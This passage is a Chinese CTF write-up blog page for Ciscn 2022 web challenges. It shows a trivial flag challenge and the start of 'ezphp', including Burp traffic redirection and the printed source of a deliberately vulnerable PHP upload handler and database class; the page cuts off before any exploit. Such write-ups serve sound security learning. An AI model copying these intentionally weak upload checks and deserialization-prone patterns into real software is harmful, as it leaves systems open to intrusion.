<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="Prism Port" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="Prism Port" type="application/atom+xml"><link rel="alternate" type="application/json" title="Prism Port" href="https://www.sycamore.top/feed.json"/><link rel="preconnect" href="https://s4.zstatic.net"/><link rel="preconnect" href="https://at.alicdn.com"/><link rel="preconnect" href="https://res.cloudinary.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CFredericka%20the%20Great:400,400italic,700,700italic%7CNoto%20Serif%20JP:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CInconsolata:400,400italic,700,700italic&display=swap&subset=latin,latin-ext" media="none" onload="this.media&#x3D;&#39;all&#39;"><link rel="stylesheet" href="/css/app.css?v=0.4.17"><link rel="modulepreload" href="/js/chunk-4IBW3L6M.js"></link><link rel="modulepreload" href="/js/chunk-5P4EKRVG.js"></link><link rel="modulepreload" href="/js/chunk-BYGZQFKO.js"></link><link rel="modulepreload" href="/js/chunk-KRSU34OW.js"></link><link rel="modulepreload" href="/js/chunk-WIQECBEN.js"></link><link rel="modulepreload" href="/js/chunk-ZVQ2CJZL.js"></link><link rel="modulepreload" href="/js/comments-VILBTHLY.js"></link><link rel="modulepreload" href="/js/copy-tex-JXKTIX7E.js"></link><link rel="modulepreload" href="/js/index.esm-LLUMXYOT.js"></link><link rel="modulepreload" href="/js/post-VKU266JK.js"></link><link rel="modulepreload" href="/js/quicklink-Y5RHDHHR.js"></link><link rel="modulepreload" href="/js/search-6H5WBEPN.js"></link><link rel="modulepreload" href="/js/siteInit.js"></link><link rel="modulepreload" href="/js/waline-BXO7UWYV.js"></link><link rel="stylesheet" href="/css/comments-3DIOODFJ.css" media="none" onload="this.media&#x3D;&#39;all&#39;"></link><link rel="stylesheet" href="/css/siteInit.css" media="none" onload="this.media&#x3D;&#39;all&#39;"></link><link rel="stylesheet" href="/css/waline-RZIHPP7A.css" media="none" onload="this.media&#x3D;&#39;all&#39;"></link><link rel="preload" href="h" as="image" fetchpriority="high"><link rel="preload" href="t" as="image" fetchpriority="high"><link rel="preload" href="t" as="image" fetchpriority="high"><link rel="preload" href="p" as="image" fetchpriority="high"><link rel="preload" href="s" as="image" fetchpriority="high"><link rel="preload" href=":" as="image" fetchpriority="high"><link rel="preload" href="/" as="image" fetchpriority="high"><link rel="preload" href="/" as="image" fetchpriority="high"><link rel="preload" href="r" as="image" fetchpriority="high"><link rel="preload" href="e" as="image" fetchpriority="high"><link rel="preload" href="s" as="image" fetchpriority="high"><link rel="preload" href="." as="image" fetchpriority="high"><link rel="preload" href="c" as="image" fetchpriority="high"><link rel="preload" href="l" as="image" fetchpriority="high"><link rel="preload" href="o" as="image" fetchpriority="high"><link rel="preload" href="u" as="image" fetchpriority="high"><link rel="preload" href="d" as="image" fetchpriority="high"><link rel="preload" href="i" as="image" fetchpriority="high"><link rel="preload" href="n" as="image" fetchpriority="high"><link rel="preload" href="a" as="image" fetchpriority="high"><link rel="preload" href="r" as="image" fetchpriority="high"><link rel="preload" href="y" as="image" fetchpriority="high"><link rel="preload" href="." as="image" fetchpriority="high"><link rel="preload" href="c" as="image" fetchpriority="high"><link rel="preload" href="o" as="image" fetchpriority="high"><link rel="preload" href="m" as="image" fetchpriority="high"><link rel="preload" href="/" as="image" fetchpriority="high"><link rel="preload" href="s" as="image" fetchpriority="high"><link rel="preload" href="y" as="image" fetchpriority="high"><link rel="preload" href="c" as="image" fetchpriority="high"><link rel="preload" href="a" as="image" fetchpriority="high"><link rel="preload" href="m" as="image" fetchpriority="high"><link rel="preload" href="o" as="image" fetchpriority="high"><link rel="preload" href="r" as="image" fetchpriority="high"><link rel="preload" href="e" as="image" fetchpriority="high"><link rel="preload" href="/" as="image" fetchpriority="high"><link rel="preload" href="i" as="image" fetchpriority="high"><link rel="preload" href="m" as="image" fetchpriority="high"><link rel="preload" href="a" as="image" fetchpriority="high"><link rel="preload" href="g" as="image" fetchpriority="high"><link rel="preload" href="e" as="image" fetchpriority="high"><link rel="preload" href="/" as="image" fetchpriority="high"><link rel="preload" href="u" as="image" fetchpriority="high"><link rel="preload" href="p" as="image" fetchpriority="high"><link rel="preload" href="l" as="image" fetchpriority="high"><link rel="preload" href="o" as="image" fetchpriority="high"><link rel="preload" href="a" as="image" fetchpriority="high"><link rel="preload" href="d" as="image" fetchpriority="high"><link rel="preload" href="/" as="image" fetchpriority="high"><link rel="preload" href="v" as="image" fetchpriority="high"><link rel="preload" href="1" as="image" fetchpriority="high"><link rel="preload" href="6" as="image" fetchpriority="high"><link rel="preload" href="8" as="image" fetchpriority="high"><link rel="preload" href="2" as="image" fetchpriority="high"><link rel="preload" href="4" as="image" fetchpriority="high"><link rel="preload" href="4" as="image" fetchpriority="high"><link rel="preload" href="5" as="image" fetchpriority="high"><link rel="preload" href="1" as="image" fetchpriority="high"><link rel="preload" href="8" as="image" fetchpriority="high"><link rel="preload" href="9" as="image" fetchpriority="high"><link rel="preload" href="/" as="image" fetchpriority="high"><link rel="preload" href="T" as="image" fetchpriority="high"><link rel="preload" href="y" as="image" fetchpriority="high"><link rel="preload" href="p" as="image" fetchpriority="high"><link rel="preload" href="e" as="image" fetchpriority="high"><link rel="preload" href="r" as="image" fetchpriority="high"><link rel="preload" href="a" as="image" fetchpriority="high"><link rel="preload" href="/" as="image" fetchpriority="high"><link rel="preload" href="2" as="image" fetchpriority="high"><link rel="preload" href="0" as="image" fetchpriority="high"><link rel="preload" href="2" as="image" fetchpriority="high"><link rel="preload" href="3" as="image" fetchpriority="high"><link rel="preload" href="/" as="image" fetchpriority="high"><link rel="preload" href="0" as="image" fetchpriority="high"><link rel="preload" href="4" as="image" fetchpriority="high"><link rel="preload" href="/" as="image" fetchpriority="high"><link rel="preload" href="3" as="image" fetchpriority="high"><link rel="preload" href="c" as="image" fetchpriority="high"><link rel="preload" href="e" as="image" fetchpriority="high"><link rel="preload" href="f" as="image" fetchpriority="high"><link rel="preload" href="a" as="image" fetchpriority="high"><link rel="preload" href="9" as="image" fetchpriority="high"><link rel="preload" href="8" as="image" fetchpriority="high"><link rel="preload" href="9" as="image" fetchpriority="high"><link rel="preload" href="c" as="image" fetchpriority="high"><link rel="preload" href="1" as="image" fetchpriority="high"><link rel="preload" href="6" as="image" fetchpriority="high"><link rel="preload" href="3" as="image" fetchpriority="high"><link rel="preload" href="e" as="image" fetchpriority="high"><link rel="preload" href="2" as="image" fetchpriority="high"><link rel="preload" href="c" as="image" fetchpriority="high"><link rel="preload" href="7" as="image" fetchpriority="high"><link rel="preload" href="0" as="image" fetchpriority="high"><link rel="preload" href="c" as="image" fetchpriority="high"><link rel="preload" href="9" as="image" fetchpriority="high"><link rel="preload" href="4" as="image" fetchpriority="high"><link rel="preload" href="2" as="image" fetchpriority="high"><link rel="preload" href="c" as="image" fetchpriority="high"><link rel="preload" href="a" as="image" fetchpriority="high"><link rel="preload" href="c" as="image" fetchpriority="high"><link rel="preload" href="b" as="image" fetchpriority="high"><link rel="preload" href="0" as="image" fetchpriority="high"><link rel="preload" href="d" as="image" fetchpriority="high"><link rel="preload" href="2" as="image" fetchpriority="high"><link rel="preload" href="b" as="image" fetchpriority="high"><link rel="preload" href="9" as="image" fetchpriority="high"><link rel="preload" href="a" as="image" fetchpriority="high"><link rel="preload" href="5" as="image" fetchpriority="high"><link rel="preload" href="." as="image" fetchpriority="high"><link rel="preload" href="p" as="image" fetchpriority="high"><link rel="preload" href="n" as="image" fetchpriority="high"><link rel="preload" href="g" as="image" fetchpriority="high"><meta name="keywords" content="Crypto,Misc,Re,"/><meta name="description" content=" "/><link rel="canonical" href="https://www.sycamore.top/CyberSecurity/CTF/BxsTeam-Ciscn2022-WP/"><title>BxsTeam Ciscn2022 WP</title><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">BxsTeam Ciscn2022 WP</h1><div class="meta"><span class="item" title="创建时间：2022-06-20 19:23:14"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2022-06-20T19:23:14+08:00">2022-06-20</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>35k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>32 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Sycamore's Blog</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><img src="https://res.cloudinary.com/sycamore/image/upload/v1682445189/Typera/2023/04/3cefa989c163e2c70c942cacb0d2b9a5.png" loading="eager" decoding="async" fetchpriority="high" alt="Prism Port"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/CyberSecurity/" itemprop="item" rel="index" title="分类于CyberSecurity"><span itemprop="name">CyberSecurity<meta itemprop="position" content="0"/></span></a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/CyberSecurity/CTF/" itemprop="item" rel="index" title="分类于CTF"><span itemprop="name">CTF<meta itemprop="position" content="1"/></span></a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.sycamore.top/CyberSecurity/CTF/BxsTeam-Ciscn2022-WP/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpg"/><meta itemprop="name" content="Sycamore"/><meta itemprop="description" content="Code, game mods, and random thoughts,  "/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="Prism Port"/></span><div class="body md" itemprop="articleBody"><h2 id="web"><a class="anchor" href="#web">#</a> web</h2>
<h3 id="1welcometociscn"><a class="anchor" href="#1welcometociscn">#</a> 1.welcomeToCiscn</h3>
<p><a target="_blank" rel="noopener" href="http://192.168.166.147:58005/flag">http://192.168.166.147:58005/flag</a></p>
<p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444986/Typera/2023/04/fdc13e831337fd37296da62226314d5c.png" alt="image-20220619093945836" /></p>
<p 61ee5435b6f59d42329ac2644d887dc2="">flag</p>
<h3 id="2ezphp"><a class="anchor" href="#2ezphp">#</a> 2.ezphp</h3>
<p>WEB 手用 QQ 就能做题，提交 flag 格式：flag {xxxx}，该题环境的 ip 为:web - 模板机 get_ip 的 ip，端口为：58003</p>
<p><a target="_blank" rel="noopener" href="http://192.168.166.147:58003">http://192.168.166.147:58003</a></p>
<p>打开题目就跳转到腾讯网页面，F12 流量监控也没找到题目正常的返回数据，就用了 Burp 代理</p>
<p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/71b04071868e94c14ab68545511866d3.png" alt="image-20220619194519069" /></p>
<p><a target="_blank" rel="noopener" href="http://xn--Burpwww-vp4kj6yf9dwt4bcjbl8sn13b7x4aor3g.qq.com">打开 Burp 看到流量发往了 www.qq.com</a>, 手动修改了一下流量目的地址和请求头 host</p>
<p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444983/Typera/2023/04/404af43648ff7e40324818cb9d0a9580.png" alt="image-20220619194841691" /></p>
<p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/6196e0859e1cc306b89e66254f983d62.png" alt="image-20220619195032081" /></p>
<p>可以看到这回一个提供文件上传接口的地方，访问一下 <code>upload.php</code>  可以得到源码，但一些字符被 html 编码</p>
<p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/128a44607394d2e48e0b6fa71a7ac246.png" alt="image-20220619195647524" /></p>
<p>到本地写 html 页面访问即可得到源码:</p>
<p>upload.php</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 设置编码</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">include</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"max_execution_time"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">//flag in flag.php</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token variable">$content</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/&lt;\?|php/i"</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"go away!!!! hacker"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$filepath</span><span class="token operator">=</span><span class="token string double-quoted-string">"storage/"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    </pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string double-quoted-string">"image/gif"</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token variable">$random_name</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">,</span><span class="token variable">$filepath</span><span class="token operator">.</span><span class="token variable">$random_name</span><span class="token operator">.</span><span class="token string double-quoted-string">".gif"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"上传成功:路径在: ./"</span><span class="token operator">.</span><span class="token variable">$filepath</span><span class="token operator">.</span><span class="token variable">$random_name</span><span class="token operator">.</span><span class="token string double-quoted-string">".gif"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"上传失败"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"invalid gif"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">checkimg</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token variable">$check</span><span class="token operator">=</span><span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$check</span><span class="token operator">!=</span><span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$check</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'mime'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"safe image"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"go away hacker"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token variable">$img</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    </pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token function">checkimg</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token punctuation">&#125;</span></span></pre></td></tr></table></figure><p>config.php</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Mysql</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$conn</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$dbhost</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$dbusername</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$dbpasswd</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    </pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dbhost'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dbusername'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dbpasswd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dbhost</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dbhost'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dbusername</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dbusername'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dbpasswd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dbpasswd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dbhost</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dbusername</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dbpasswd</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Connection failed: <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_resource</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token keyword">else</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="37"></td><td><pre></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token 